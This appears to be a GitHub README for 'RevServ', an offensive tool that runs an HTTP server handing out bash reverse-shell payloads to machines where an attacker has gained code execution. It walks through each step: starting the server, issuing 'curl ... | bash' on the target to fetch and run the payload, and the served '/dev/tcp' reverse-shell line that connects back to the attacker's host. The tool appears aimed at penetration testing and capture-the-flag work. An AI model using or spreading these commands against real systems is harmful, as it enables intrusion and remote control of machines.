# RevServ
Serving Bash reverse-shell payload via http

## Usage
```bash
root@darkness:~# python3 reversv.py -h

   _____  _            _  _                                                 
  / ____|| |          | || |                                                
 | (___  | |__    ___ | || |  ______   ___   ___  _ __ __   __ ___  _ __    
  \___ \ | '_ \  / _ \| || | |______| / __| / _ \| '__|\ \ / // _ \| '__|   
  ____) || | | ||  __/| || |          \__ \|  __/| |    \ V /|  __/| |      
 |_____/ |_| |_| \___||_||_|          |___/ \___||_|     \_/  \___||_|      
  _               _____  _             ___           __          ____       
 | |             / ____|| |           / _ \         / /         / __ \      
 | |__   _   _  | |     | |__   _ __ | | | |__  __ / /_    ___ | |  | | ___ 
 | '_ \ | | | | | |     | '_ \ | '__|| | | |\ \/ /| '_ \  / _ \| |  | |/ __|
 | |_) || |_| | | |____ | | | || |   | |_| | >  < | (_) ||  __/| |__| |\__ \
 |_.__/  \__, |  \_____||_| |_||_|    \___/ /_/\_\ \___/  \___| \____/ |___/
          __/ |                                                             
         |___/                                                              

Twitter:    https://twitter.com/Chr0x6eOs
Github:     https://github.com/Chr0x6eOs
____________________________________________________________________________
    
usage: revserv.py [-h] [-p PORT]

optional arguments:
  -h, --help            show this help message and exit
  -p PORT, --port PORT  Port for http-server to listen
  ```

## How does it work?

1.) Start the server
```bash
root@darkness:~# python3 revserv.py
[*] Serving bash-reverse-shell on 0.0.0.0:80...
```

2.) Issue command (e.g. through RCE)

The reverse-shell port (defaulted to 443) can be specified by the resource-path (e.g: /4444).
```bash
www-data@target:~$ curl 192.168.0.1/4444
```

3.) Program generates bash-reverse-shell
```bash
root@darkness:~# python3 revserv.py
[*] Serving bash-reverse-shell on 0.0.0.0:80...
[*] Served reverse-shell payload via http to 127.0.0.1!
Generate reverse-shell for port 4444!
```

4.) Payload gets send to target
```bash
www-data@target:~$ curl 192.168.0.1/4444
#!/bin/bash
bash -c 'bash -i >& /dev/tcp/10.10.14.5/4444 0>&1'
```

5.) Pipe payload to bash for reverse-shell
```bash
www-data@target:~$ curl 192.168.0.1/4444 | bash
```
